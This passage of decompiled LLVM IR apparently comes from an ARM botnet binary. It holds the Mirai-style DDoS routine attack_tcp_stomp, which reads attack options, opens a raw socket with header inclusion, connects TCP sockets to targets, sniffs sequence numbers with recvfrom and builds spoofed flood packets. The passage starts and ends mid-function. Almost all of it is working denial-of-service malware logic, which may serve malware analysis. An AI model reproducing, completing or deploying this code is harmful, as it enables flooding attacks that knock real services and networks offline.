  uselistorder i32 %v6_9a9c, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_9a84, { 1, 2, 0 }
  uselistorder i32 %v1_9a64, { 1, 2, 0 }
  uselistorder i32 %v1_9a44, { 1, 2, 0 }
  uselistorder i32 %v1_9a24, { 1, 2, 0 }
  uselistorder i32 %v1_9a04, { 1, 2, 0 }
  uselistorder i32 %v1_99e4, { 1, 2, 0 }
  uselistorder i32 %v6_99c0, { 1, 0 }
  uselistorder i32 %v1_99a8, { 1, 2, 0 }
  uselistorder i32 %v6_9940, { 2, 1, 3, 0 }
  uselistorder i32 %v2_9928, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v2_9918, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 47, 46, 48, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9fa4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9f78, { 1, 0 }
  uselistorder label %dec_label_pc_9f68, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9f58, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_9cc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9c94, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9bd0, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_9bb0, { 1, 0 }
  uselistorder label %dec_label_pc_9b8c, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_9b3c, { 1, 0 }
  uselistorder label %dec_label_pc_9b20, { 1, 0 }
}

define i32 @attack_tcp_stomp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_a0b0 = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_a0cc = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_a0d8 = load i32, i32* @r6, align 4
  store i32 %v0_a0d8, i32* %r0.global-to-local, align 4
  %v2_a0dc = call i32 @calloc(i32 %v0_a0d8, i32 4)
  %v0_a0e0 = load i32, i32* @r5, align 4
  store i32 %v0_a0e0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a0f0 = load i32, i32* @r4, align 4
  store i32 %v0_a0f0, i32* %r0.global-to-local, align 4
  %v5_a0f4 = inttoptr i32 %v0_a0e0 to i32*
  %v6_a0f4 = call i32 @attack_get_opt_int(i32 %v0_a0f0, i32* %v5_a0f4, i32 2, i32 0, i32 %v2_a0dc)
  %v1_a100 = urem i32 %v6_a0f4, 256
  store i32 %v1_a100, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a10c = load i32, i32* @r5, align 4
  store i32 %v0_a10c, i32* %r1.global-to-local, align 4
  %v0_a110 = load i32, i32* @r4, align 4
  store i32 %v0_a110, i32* %r0.global-to-local, align 4
  %v5_a114 = trunc i32 %v6_a0f4 to i8
  %v6_a118 = inttoptr i32 %v0_a10c to i32*
  %v7_a118 = call i32 @attack_get_opt_int(i32 %v0_a110, i32* %v6_a118, i32 3, i32 65535, i32 %v6_a0f4)
  %v0_a11c = load i32, i32* @r5, align 4
  store i32 %v0_a11c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a118, i32* @r7, align 4
  %v0_a12c = load i32, i32* @r4, align 4
  store i32 %v0_a12c, i32* %r0.global-to-local, align 4
  %v5_a130 = inttoptr i32 %v0_a11c to i32*
  %v6_a130 = call i32 @attack_get_opt_int(i32 %v0_a12c, i32* %v5_a130, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_a138 = urem i32 %v6_a130, 256
  store i32 %v1_a138, i32* %ip.global-to-local, align 4
  %v0_a13c = load i32, i32* @r5, align 4
  store i32 %v0_a13c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a148 = load i32, i32* @r4, align 4
  store i32 %v0_a148, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_a130, 16777216
  %v5_a150 = sdiv i32 %sext, 16777216
  %v6_a150 = inttoptr i32 %v0_a13c to i32*
  %v7_a150 = call i32 @attack_get_opt_int(i32 %v0_a148, i32* %v6_a150, i32 5, i32 1, i32 %v5_a150)
  %v1_a15c = urem i32 %v7_a150, 256
  store i32 %v1_a15c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_a164 = load i32, i32* @r5, align 4
  store i32 %v0_a164, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a16c = load i32, i32* @r4, align 4
  store i32 %v0_a16c, i32* %r0.global-to-local, align 4
  %v5_a174 = inttoptr i32 %v0_a164 to i32*
  %v6_a174 = call i32 @attack_get_opt_int(i32 %v0_a16c, i32* %v5_a174, i32 7, i32 65535, i32 %v1_a15c)
  %v0_a178 = load i32, i32* @r5, align 4
  store i32 %v0_a178, i32* %r1.global-to-local, align 4
  %v3_a17c = mul i32 %v6_a174, 65536
  store i32 %v3_a17c, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a188 = load i32, i32* @r4, align 4
  store i32 %v0_a188, i32* %r0.global-to-local, align 4
  %v3_a18c = urem i32 %v6_a174, 65536
  store i32 %v3_a18c, i32* @sl, align 4
  %v5_a190 = inttoptr i32 %v0_a178 to i32*
  %v6_a190 = call i32 @attack_get_opt_int(i32 %v0_a188, i32* %v5_a190, i32 11, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v1_a198 = urem i32 %v6_a190, 256
  store i32 %v1_a198, i32* %ip.global-to-local, align 4
  %v0_a19c = load i32, i32* @r5, align 4
  store i32 %v0_a19c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a1a8 = load i32, i32* @r4, align 4
  store i32 %v0_a1a8, i32* %r0.global-to-local, align 4
  %v5_a1b0 = inttoptr i32 %v0_a19c to i32*
  %v6_a1b0 = call i32 @attack_get_opt_int(i32 %v0_a1a8, i32* %v5_a1b0, i32 12, i32 1, i32 %v1_a198)
  %v1_a1b8 = urem i32 %v6_a1b0, 256
  store i32 %v1_a1b8, i32* %ip.global-to-local, align 4
  %v0_a1bc = load i32, i32* @r5, align 4
  store i32 %v0_a1bc, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a1c8 = load i32, i32* @r4, align 4
  store i32 %v0_a1c8, i32* %r0.global-to-local, align 4
  %v5_a1d0 = inttoptr i32 %v0_a1bc to i32*
  %v6_a1d0 = call i32 @attack_get_opt_int(i32 %v0_a1c8, i32* %v5_a1d0, i32 13, i32 1, i32 %v1_a1b8)
  %v1_a1d8 = urem i32 %v6_a1d0, 256
  store i32 %v1_a1d8, i32* %ip.global-to-local, align 4
  %v0_a1dc = load i32, i32* @r5, align 4
  store i32 %v0_a1dc, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a1e8 = load i32, i32* @r4, align 4
  store i32 %v0_a1e8, i32* %r0.global-to-local, align 4
  %v5_a1f0 = inttoptr i32 %v0_a1dc to i32*
  %v6_a1f0 = call i32 @attack_get_opt_int(i32 %v0_a1e8, i32* %v5_a1f0, i32 14, i32 0, i32 %v1_a1d8)
  %v1_a1f8 = urem i32 %v6_a1f0, 256
  store i32 %v1_a1f8, i32* %ip.global-to-local, align 4
  %v0_a1fc = load i32, i32* @r5, align 4
  store i32 %v0_a1fc, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a208 = load i32, i32* @r4, align 4
  store i32 %v0_a208, i32* %r0.global-to-local, align 4
  %v5_a210 = inttoptr i32 %v0_a1fc to i32*
  %v6_a210 = call i32 @attack_get_opt_int(i32 %v0_a208, i32* %v5_a210, i32 15, i32 0, i32 %v1_a1f8)
  %v1_a218 = urem i32 %v6_a210, 256
  store i32 %v1_a218, i32* %ip.global-to-local, align 4
  %v0_a21c = load i32, i32* @r5, align 4
  store i32 %v0_a21c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a228 = load i32, i32* @r4, align 4
  store i32 %v0_a228, i32* %r0.global-to-local, align 4
  %v5_a230 = inttoptr i32 %v0_a21c to i32*
  %v6_a230 = call i32 @attack_get_opt_int(i32 %v0_a228, i32* %v5_a230, i32 16, i32 0, i32 %v1_a218)
  %v1_a238 = urem i32 %v6_a230, 256
  store i32 %v1_a238, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_a244 = load i32, i32* @r5, align 4
  store i32 %v0_a244, i32* %r1.global-to-local, align 4
  %v0_a248 = load i32, i32* @r4, align 4
  store i32 %v0_a248, i32* %r0.global-to-local, align 4
  %v5_a250 = inttoptr i32 %v0_a244 to i32*
  %v6_a250 = call i32 @attack_get_opt_int(i32 %v0_a248, i32* %v5_a250, i32 0, i32 768, i32 %v1_a238)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a260 = load i32, i32* @r5, align 4
  store i32 %v0_a260, i32* %r1.global-to-local, align 4
  %v0_a264 = load i32, i32* @r4, align 4
  store i32 %v0_a264, i32* %r0.global-to-local, align 4
  %v5_a268 = inttoptr i32 %v0_a260 to i32*
  %v6_a268 = call i32 @attack_get_opt_int(i32 %v0_a264, i32* %v5_a268, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_a270 = urem i32 %v6_a268, 256
  store i32 %v1_a270, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_a284 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_a284, i32* %r0.global-to-local, align 4
  %v7_a288 = icmp eq i32 %v3_a284, -1
  store i1 %v7_a288, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a284, i32* @sb, align 4
  br i1 %v7_a288, label %dec_label_pc_a478, label %dec_label_pc_a294

dec_label_pc_a294:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a29c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a29c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a2b0 = call i32 @__GI_setsockopt(i32 %v3_a284, i32 0, i32 3, i32 %v6_a29c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_a2b0, i32* %r0.global-to-local, align 4
  %v7_a2b4 = icmp eq i32 %v5_a2b0, -1
  store i1 %v7_a2b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a2b4, label %dec_label_pc_a470, label %dec_label_pc_a2bc

dec_label_pc_a2bc:                                ; preds = %dec_label_pc_a294
  %v0_a2bc = load i32, i32* @r7, align 4
  %v3_a2bc = mul i32 %v0_a2bc, 65536
  store i32 %v3_a2bc, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_a2c4 = load i32, i32* @r6, align 4
  %v2_a2c4 = icmp eq i32 %v0_a2c4, 0
  store i1 %v2_a2c4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_a2cc = urem i32 %v0_a2bc, 65536
  store i32 %v3_a2cc, i32* @fp, align 4
  br i1 %v2_a2c4, label %dec_label_pc_a6fc, label %dec_label_pc_a2d4.preheader

dec_label_pc_a2d4.preheader:                      ; preds = %dec_label_pc_a2bc
  %v2_a320 = ptrtoint i32* %stack_var_-144 to i32
  %v2_a364 = ptrtoint i32* %stack_var_-64 to i32
  %v2_a39c = ptrtoint i32* %stack_var_-80 to i32
  %v2_a3a8 = ptrtoint i32* %stack_var_-336 to i32
  %v2_a3ac = ptrtoint i32* %stack_var_-48 to i32
  %v4_a40c = zext i8 %tmp to i32
  %v1_a410 = and i32 %v4_a40c, 18
  %v2_a414 = icmp eq i32 %v1_a410, 18
  %v3_a3f8 = sext i16 %tmp61 to i32
  %v1_a41c = and i32 %v4_a40c, 5
  %v2_a41c = icmp eq i32 %v1_a41c, 0
  %v4_a35c = add i32 %v2_a320, 82
  %v5_a35c = inttoptr i32 %v4_a35c to i16*
  %v1_a54c = add i32 %v6_a250, 40
  %v1_a660 = urem i32 %v6_a190, 2
  %tmp97 = sub nsw i32 0, %v1_a660
  %v4_a668 = and i32 %tmp97, 32
  %v1_a678 = urem i32 %v6_a1b0, 2
  %tmp98 = sub nsw i32 0, %v1_a678
  %v4_a680 = and i32 %tmp98, 16
  %v1_a690 = urem i32 %v6_a1d0, 2
  %tmp99 = sub nsw i32 0, %v1_a690
  %v4_a698 = and i32 %tmp99, 8
  %v1_a6a8 = urem i32 %v6_a1f0, 2
  %tmp100 = sub nsw i32 0, %v1_a6a8
  %v4_a6b0 = and i32 %tmp100, 4
  %v1_a6c0 = urem i32 %v6_a210, 2
  %tmp101 = sub nsw i32 0, %v1_a6c0
  %v3_a6c8 = and i32 %tmp101, 2
  %v1_a6d8 = urem i32 %v6_a230, 2
  br label %dec_label_pc_a2d4

dec_label_pc_a2d4:                                ; preds = %dec_label_pc_a2d4.preheader, %dec_label_pc_a448
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_a448 ], [ %tmp34, %dec_label_pc_a2d4.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_a448 ], [ %tmp37, %dec_label_pc_a2d4.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_a2e0 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_a2e0, i32* %r0.global-to-local, align 4
  %v7_a2e4 = icmp eq i32 %v3_a2e0, -1
  store i1 %v7_a2e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a2e0, i32* @r5, align 4
  br i1 %v7_a2e4, label %dec_label_pc_a448, label %dec_label_pc_a2f0

dec_label_pc_a2f0:                                ; preds = %dec_label_pc_a2d4, %dec_label_pc_a424
  %v0_a2f8 = phi i32 [ %v3_a438, %dec_label_pc_a424 ], [ %v3_a2e0, %dec_label_pc_a2d4 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_a424 ], [ %stack_var_-62.0, %dec_label_pc_a2d4 ]
  %stack_var_-60.1 = phi i32 [ %v0_a4f8, %dec_label_pc_a424 ], [ %stack_var_-60.0, %dec_label_pc_a2d4 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_a2f8 = call i32 @__libc_fcntl(i32 %v0_a2f8, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_a300 = or i32 %v2_a2f8, 2048
  store i32 %v1_a300, i32* @r2, align 4
  %v0_a304 = load i32, i32* @r5, align 4
  store i32 %v0_a304, i32* %r0.global-to-local, align 4
  %v2_a308 = call i32 @__libc_fcntl(i32 %v0_a304, i32 4)
  %v3_a30c = load i32, i32* %stack_var_-44, align 4
  %v5_a314 = mul i32 %v3_a30c, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_a320, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_a328 = add i32 %v5_a314, %arg2
  store i32 %v2_a328, i32* %r3.global-to-local, align 4
  %v1_a32c = add i32 %v2_a328, 20
  %v2_a32c = inttoptr i32 %v1_a32c to i8*
  %v3_a32c = load i8, i8* %v2_a32c, align 1
  %v4_a32c = zext i8 %v3_a32c to i32
  store i32 %v4_a32c, i32* %r2.global-to-local, align 4
  %v2_a330 = icmp ugt i8 %v3_a32c, 30
  %v7_a330 = icmp eq i8 %v3_a32c, 31
  store i1 %v7_a330, i1* %cpsr_z.global-to-local, align 1
  %v2_a334 = xor i1 %v7_a330, true
  %v3_a334 = and i1 %v2_a330, %v2_a334
  br i1 %v3_a334, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_a2f0
  %v5_a334 = add i32 %v2_a328, 16
  %v6_a334 = inttoptr i32 %v5_a334 to i32*
  %v7_a334 = load i32, i32* %v6_a334, align 4
  store i32 %v7_a334, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_a2f0, %bb
  %v4_a338 = phi i32 [ %v2_a328, %dec_label_pc_a2f0 ], [ %v7_a334, %bb ]
  %v4_a338.stack_var_-60.1 = select i1 %v3_a334, i32 %v4_a338, i32 %stack_var_-60.1
  %v2_a33c = xor i1 %v2_a330, true
  %v3_a33c = or i1 %v7_a330, %v2_a33c
  br i1 %v3_a33c, label %dec_label_pc_a484, label %dec_label_pc_a340

dec_label_pc_a340:                                ; preds = %bb71, %dec_label_pc_a484
  %v0_a4f8 = phi i32 [ %v5_a4d4, %dec_label_pc_a484 ], [ %v4_a338.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_a348 = load i32, i32* @sl, align 4
  %v9_a348 = icmp eq i32 %v0_a348, 65535
  store i1 %v9_a348, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a348, label %dec_label_pc_a4e0, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_a340
  %v4_a34c = udiv i32 %v0_a348, 256
  %v2_a350 = urem i32 %v0_a348, 256
  store i32 %v2_a350, i32* %r2.global-to-local, align 4
  %v5_a354 = mul nuw nsw i32 %v2_a350, 256
  %v6_a354 = or i32 %v5_a354, %v4_a34c
  store i32 %v6_a354, i32* %r3.global-to-local, align 4
  store i32 %v2_a320, i32* %r0.global-to-local, align 4
  %v2_a35c = trunc i32 %v6_a354 to i16
  store i16 %v2_a35c, i16* %v5_a35c, align 2
  br label %dec_label_pc_a364

dec_label_pc_a364:                                ; preds = %.thread9, %dec_label_pc_a4e0
  %stack_var_-62.2 = phi i16 [ %v1_a4e0, %dec_label_pc_a4e0 ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_a364, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_a36c = load i32, i32* @r5, align 4
  store i32 %v0_a36c, i32* %r0.global-to-local, align 4
  %v3_a370 = call i32 @__libc_connect(i32 %v0_a36c, i32 %v2_a364, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_a378 = call i32 @__GI_time(i32* null)
  store i32 %v2_a378, i32* %r0.global-to-local, align 4
  store i32 %v2_a378, i32* @r4, align 4
  %v9_a3d8 = icmp eq i32 %tmp35, %v0_a4f8
  %v4_a400 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_a3d8 to i32
  %v9_a3ec = icmp eq i1 %v9_a3d8, false
  %v9_a404 = icmp eq i32 %v3_a3f8, %v4_a400
  br label %dec_label_pc_a394

dec_label_pc_a384:                                ; preds = %.thread, %dec_label_pc_a3f4, %dec_label_pc_a41c, %bb75
  %v2_a384 = call i32 @__GI_time(i32* null)
  %v0_a388 = load i32, i32* @r4, align 4
  %v2_a388 = sub i32 %v2_a384, %v0_a388
  store i32 %v2_a388, i32* %r0.global-to-local, align 4
  %v7_a38c = icmp eq i32 %v2_a388, 10
  store i1 %v7_a38c, i1* %cpsr_z.global-to-local, align 1
  %v8_a390 = icmp sgt i32 %v2_a388, 10
  br i1 %v8_a390, label %dec_label_pc_a424, label %dec_label_pc_a394

dec_label_pc_a394:                                ; preds = %dec_label_pc_a384, %dec_label_pc_a364
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_a3a8, i32* %r1.global-to-local, align 4
  store i32 %v2_a3ac, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a3b4 = load i32, i32* @sb, align 4
  store i32 %v0_a3b4, i32* %r0.global-to-local, align 4
  %v6_a3bc = call i32 @__libc_recvfrom(i32 %v0_a3b4, i32 %v2_a3a8, i32 256, i32 16384, i32 %v2_a39c, i32 %v2_a3ac)
  store i32 %v6_a3bc, i32* %r2.global-to-local, align 4
  %v7_a3c4 = icmp eq i32 %v6_a3bc, -1
  store i1 %v7_a3c4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_a3c4, label %dec_label_pc_a478, label %dec_label_pc_a3d0

dec_label_pc_a3d0:                                ; preds = %dec_label_pc_a394
  store i32 %v0_a4f8, i32* @r1, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_a3e4 = icmp eq i32 %v6_a3bc, 40
  store i1 %v7_a3e4, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_a3bc, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_a3d0
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_a384

bb75:                                             ; preds = %dec_label_pc_a3d0
  store i1 %v9_a3ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a3ec, label %dec_label_pc_a384, label %dec_label_pc_a3f4

dec_label_pc_a3f4:                                ; preds = %bb75
  store i32 %v3_a3f8, i32* @lr, align 4
  store i32 %v2_a320, i32* @r3, align 4
  store i32 %v4_a400, i32* %r2.global-to-local, align 4
  store i1 %v9_a404, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a404, label %dec_label_pc_a40c, label %dec_label_pc_a384

dec_label_pc_a40c:                                ; preds = %dec_label_pc_a3f4
  store i32 %v4_a40c, i32* %r2.global-to-local, align 4
  store i32 %v1_a410, i32* @r3, align 4
  store i1 %v2_a414, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a414, label %dec_label_pc_a4f0, label %dec_label_pc_a41c

dec_label_pc_a41c:                                ; preds = %dec_label_pc_a40c
  store i1 %v2_a41c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a41c, label %dec_label_pc_a384, label %dec_label_pc_a424

dec_label_pc_a424:                                ; preds = %dec_label_pc_a41c, %dec_label_pc_a384
  %v0_a424 = load i32, i32* @r5, align 4
  store i32 %v0_a424, i32* %r0.global-to-local, align 4
  %v1_a428 = call i32 @__GI___libc_close(i32 %v0_a424)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_a438 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_a438, i32* %r0.global-to-local, align 4
  %v3_a43c = icmp eq i32 %v3_a438, -1
  %v8_a43c = icmp eq i32 %v3_a438, -1
  store i1 %v8_a43c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a438, i32* @r5, align 4
  br i1 %v3_a43c, label %dec_label_pc_a448, label %dec_label_pc_a2f0

dec_label_pc_a448:                                ; preds = %dec_label_pc_a424, %dec_label_pc_a2d4, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_a2d4 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_a424 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_a2d4 ], [ %v0_a4f8, %bb82 ], [ %v0_a4f8, %dec_label_pc_a424 ]
  %v3_a448 = load i32, i32* %stack_var_-44, align 4
  %v1_a44c = add i32 %v3_a448, 1
  store i32 %v1_a44c, i32* @r3, align 4
  %v1_a450 = load i32, i32* @r6, align 4
  %v9_a450 = icmp eq i32 %v1_a44c, %v1_a450
  store i1 %v9_a450, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a44c, i32* %stack_var_-44, align 4
  %v5_a458 = icmp slt i32 %v1_a44c, %v1_a450
  br i1 %v5_a458, label %dec_label_pc_a2d4, label %dec_label_pc_a45c

dec_label_pc_a45c:                                ; preds = %dec_label_pc_a448
  store i32 %v6_a250, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a70c

dec_label_pc_a470:                                ; preds = %dec_label_pc_a294
  %v0_a470 = load i32, i32* @sb, align 4
  store i32 %v0_a470, i32* %r0.global-to-local, align 4
  %v1_a474 = call i32 @__GI___libc_close(i32 %v0_a470)
  store i32 %v1_a474, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a478

dec_label_pc_a478:                                ; preds = %dec_label_pc_a394, %entry, %dec_label_pc_a470
  %v1_a480 = phi i32 [ %v3_a284, %entry ], [ %v1_a474, %dec_label_pc_a470 ], [ 0, %dec_label_pc_a394 ]
  store i32 %v27_a0b0, i32* %lr.global-to-local, align 4
  ret i32 %v1_a480

dec_label_pc_a484:                                ; preds = %bb71
  %v1_a484 = add i32 %v4_a338, 16
  %v2_a484 = inttoptr i32 %v1_a484 to i32*
  %v3_a484 = load i32, i32* %v2_a484, align 4
  store i32 %v3_a484, i32* @r4, align 4
  %v0_a488 = call i32 @rand_next()
  store i32 %v0_a488, i32* %r0.global-to-local, align 4
  %v3_a48c = load i32, i32* %stack_var_-44, align 4
  %v5_a494 = mul i32 %v3_a48c, 24
  %v0_a49c = load i32, i32* @r4, align 4
  %v1_a49c = and i32 %v0_a49c, 16711680
  store i32 %v1_a49c, i32* %ip.global-to-local, align 4
  %v3_a4a0 = udiv i32 %v0_a49c, 16777216
  %v2_a4a4 = add i32 %v5_a494, %arg2
  store i32 %v2_a4a4, i32* %r1.global-to-local, align 4
  %v4_a4a8 = udiv i32 %v1_a49c, 256
  %v5_a4a8 = or i32 %v4_a4a8, %v3_a4a0
